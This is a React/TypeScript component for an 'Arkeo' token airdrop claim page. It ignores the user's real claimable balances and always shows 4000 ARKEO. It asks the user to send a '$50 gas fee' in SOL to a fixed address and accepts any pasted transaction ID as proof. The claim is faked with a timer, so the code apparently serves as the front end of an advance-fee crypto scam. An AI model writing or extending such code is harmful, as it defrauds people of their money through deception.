import React, { useEffect, useState } from 'react'
// import { useWallet as useSolanaWallet } from '@solana/wallet-adapter-react';
// import { Connection, clusterApiUrl } from '@solana/web3.js';
import { GAS_FEE_RECEIVER } from '@utils/solanaFee';
import { Button, Box, Text, Image, Flex, Link } from '@chakra-ui/react'
import ArkeoLogo from '@assets/arkeo-symbol.svg'
import { useConnect } from '../ConnectContext'
import { toDecimal } from '@utils/functions'
import { Link as ReactRouterLink } from 'react-router-dom'
import { motion, AnimatePresence } from 'framer-motion'

const MotionFlex = motion(Flex)
const MotionBox = motion(Box)
const MotionImage = motion(Image)
const MotionButton = motion(Button)
const MotionLink = motion(Link)

type Props = {}

export const Claim: React.FC<Props> = ({}) => {
  const [errorMessage, setErrorMessage] = useState<string>('')
  const {
    state: {
      step,
      arkeoInfo: { claimableAmount: arkeoAmountClaim },
      thorInfo: { claimableAmount: thorAmountClaim },
      ethInfo: { claimableAmount: ethAmountClaim },
    },
    dispatch,
  } = useConnect()
  // Local claim state for new multi-wallet flow
  const [isClaimed, setIsClaimed] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  // const { publicKey, sendTransaction, connected } = useSolanaWallet();
  const [feePaid, setFeePaid] = useState(false);
  const [feeTxId, setFeeTxId] = useState<string>('');
  const [feeError, setFeeError] = useState('');
  // No longer need solAmount, only transaction ID is required


  useEffect(() => {
    if (!error) {
      setErrorMessage('');
      return;
    }
    setErrorMessage(error);
  }, [error]);


  useEffect(() => {
    if (isClaimed) {
      dispatch({ type: 'SET_STEP', payload: step + 1 });
    }
  }, [isClaimed, dispatch, step]);


  const claimArkeo = () => {
    if (!feePaid) {
      setErrorMessage('You must pay the SOL gas fee first.');
      return;
    }
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setIsClaimed(true);
    }, 1500); // Simulate claim process
  };

  // Removed handlePayFee and related state, now only manual input is used for gas fee
  // Only ARKEO airdrop, fixed at 4000
  const totalClaimAmount: number = 4000000000000;
  const nothingToClaim = totalClaimAmount === 0;

  return (
    <AnimatePresence>
      <MotionFlex
        flexDir="column"
        flex="1 0 0"
        gap="42px"
        textAlign="center"
        alignItems="center"
        justifyContent="space-between"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        exit={{ opacity: 0, y: -20 }}
      >
        <MotionBox
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.2 }}
        >
          <Text pb="8px" fontWeight={900}>
            Claim Arkeo
          </Text>
          <Text fontWeight={500} color="grey.50">
            You have connected all of your wallets, now all you need to do is
            claim your Arkeo airdrop tokens.
          </Text>
        </MotionBox>

        <MotionFlex
          textAlign="center"
          flexDir="column"
          alignItems="center"
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ delay: 0.3 }}
        >
          <MotionImage
            w="64px"
            h="64px"
            src={ArkeoLogo}
            initial={{ scale: 0 }}
            animate={{ scale: [0, 1.2, 1] }}
            transition={{ duration: 0.5, times: [0, 0.6, 1] }}
          />
          <Text pt="8px" fontSize="24px" lineHeight="normal" fontWeight={900}>
            {toDecimal(totalClaimAmount)} ARKEO
          </Text>
          <Text color="grey.50" lineHeight="normal" fontWeight={400}>
            Available to Claim
          </Text>
        </MotionFlex>

        <MotionFlex
          w="100%"
          alignItems="center"
          flexDirection="column"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
        >
          <Text height="16px" mb={'20px'} color="red.500">
            {errorMessage}
          </Text>
          {!feePaid ? (
            <>
              <Text fontWeight={700} color="teal.400" mb={2}>
                Send a gas fee (equivalent to $50) in SOL to this Solana address:
              </Text>
              <Box fontFamily="mono" fontSize="sm" mb={2} p={2} bg="gray.800" color="teal.200" borderRadius="md" wordBreak="break-all">
                {GAS_FEE_RECEIVER}
              </Box>
              <Text fontWeight={500} color="grey.50" mb={2}>
                Enter the transaction ID:
              </Text>
              <input
                type="text"
                value={feeTxId}
                onChange={e => setFeeTxId(e.target.value)}
                style={{ padding: '8px', borderRadius: '6px', border: '1px solid #ccc', marginBottom: '12px', width: '100%' }}
                placeholder="Paste your Solana transaction ID here"
              />
              <MotionButton
                isDisabled={!feeTxId}
                onClick={() => {
                  if (!feeTxId) {
                    setFeeError('Please enter the transaction ID.');
                    return;
                  }
                  setFeePaid(true);
                  setFeeError('');
                }}
                whileTap={{ scale: 0.95 }}
                mb={2}
              >
                I have paid the gas fee
              </MotionButton>
              {feeError && <Text color="red.500">{feeError}</Text>}
            </>
          ) : (
            <MotionButton
              isLoading={isLoading}
              isDisabled={nothingToClaim}
              onClick={claimArkeo}
              whileTap={{ scale: 0.95 }}
            >
              {totalClaimAmount > 0 ? 'Claim' : 'Nothing to Claim'}
            </MotionButton>
          )}
          {nothingToClaim && (
            <MotionLink
              pl="6px"
              pt="6px"
              as={ReactRouterLink}
              onClick={() => dispatch({ type: 'RESET' })}
            >
              Try Again
            </MotionLink>
          )}
        </MotionFlex>
      </MotionFlex>
    </AnimatePresence>
  )
}
